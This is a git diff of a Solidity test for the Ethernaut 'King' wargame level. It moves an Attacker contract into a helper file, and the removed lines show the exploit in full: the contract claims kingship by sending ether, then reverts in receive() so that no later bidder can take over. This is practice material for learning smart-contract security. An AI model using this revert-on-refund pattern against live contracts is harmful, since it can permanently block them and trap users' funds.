@@ -3,6 +3,7 @@ pragma solidity ^0.8.13;
 
 import {Test, console} from "forge-std/Test.sol";
 import {King} from "ethernaut/levels/King.sol";
+import {Attacker} from "~/helpers/King.sol";
 
 contract KingTest is Test {
     King target;
@@ -41,25 +42,4 @@ contract KingTest is Test {
     }
 
     receive() external payable {}
-}
-
-contract Attacker {
-    address payable target;
-
-    constructor(address to) payable {
-        target = payable(to);
-    }
-
-    function attack() external payable {
-        // become the king
-        (bool ok,) = target.call{value: msg.value}("");
-        require(ok, "failed to become king");
-    }
-
-    receive() external payable {
-        // if someone else tries to become a king
-        // they will have to return you your money back,
-        // but this will not allow it
-        revert("no king for you!");
-    }
 }
